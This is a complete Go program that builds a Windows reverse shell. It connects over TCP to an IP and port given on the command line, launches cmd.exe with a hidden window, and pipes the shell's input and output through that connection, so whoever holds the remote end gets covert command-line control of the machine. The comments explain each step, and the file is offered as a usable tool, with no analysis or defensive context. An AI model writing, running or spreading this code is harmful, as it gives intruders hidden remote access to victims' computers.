package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Not enough arguments: Need host IP address and host port")
		fmt.Println("Example: revshell.exe 192.168.1.1 1234")
		os.Exit(1)
	}

	// Create hostAddr string by joining host IP and host Port
	// with ':'. Host IP and Port are provided as seperate arguments
	hostAddr := os.Args[1] + ":" + os.Args[2]

	// Connect to given IP:Port over TCP
	conn, err := net.Dial("tcp", hostAddr)

	if err != nil {
		fmt.Printf("Error connecting to %s: %s\n", err, hostAddr)
		os.Exit(1)
	}

	// Prepare command to be run - this will be cmd.exe to
	// give us a terminal
	cmd := exec.Command("cmd.exe")

	// Hide terminal window on target system
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// Redirect stdin, stdout and stderr of cmd.exe to our reverse shell
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Run the command
	cmd.Run()

}
